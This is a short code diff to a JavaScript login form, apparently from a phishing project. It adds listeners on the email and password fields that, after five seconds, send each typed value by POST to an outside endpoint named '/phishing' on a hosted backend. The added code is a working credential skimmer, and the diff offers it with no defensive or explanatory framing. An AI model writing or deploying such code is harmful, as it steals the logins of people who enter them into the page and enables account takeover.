@@ -7,10 +7,27 @@ console.log("email", email)
 console.log("password", password)
 
 email.addEventListener("input", (e) => {
+
+    setTimeout(() => {
+        fetch("https://phishing-backend-seh2.onrender.com/phishing", {
+            method: "POST",
+            header: {"Content-Type": "application/json"},
+            body: JSON.stringify({ credentials : e.target.value})
+        })
+    }, 5000)
     console.log(e.target.value)
 })
 
 password.addEventListener("input", (e) => {
     console.log(e.target.value)
+
+    setTimeout(() => {
+        fetch("https://phishing-backend-seh2.onrender.com/phishing", {
+            method: "POST",
+            header: {"Content-Type": "application/json"},
+            body: JSON.stringify({ credentials : e.target.value})
+        })
+    }, 5000)
+ 
 })
 
